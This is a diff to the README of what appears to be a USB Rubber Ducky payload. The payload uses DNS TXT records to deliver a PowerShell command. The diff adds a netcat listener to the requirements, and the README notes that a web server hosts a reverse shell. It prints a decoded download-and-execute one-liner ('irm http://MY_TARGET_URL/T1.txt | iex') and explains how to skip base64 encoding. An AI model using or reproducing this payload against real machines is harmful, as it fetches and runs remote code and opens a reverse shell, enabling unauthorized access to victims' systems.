@@ -5,8 +5,10 @@ A usb rubber ducky payload that leverages DNS TXT records to perform command inj
 ## Requirements
 A domain with the ability to manipulate the DNS TXT records.
 Web Server hosting the payload. In this example, python3 http.server was used to host a reverseshell.
+A listener for incoming connections like netcat.
 Provide URL used for Example
 DEFINE  #MY_TARGET_URL example.com
+
 ## Notes
 No base64 can be used as an option by replacing "$a=",";powershell -e $a" with just "|iex" for the STRING payload below. Examples of the decoded command and encoded command are shown below to put into DNS TXT record.
 Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
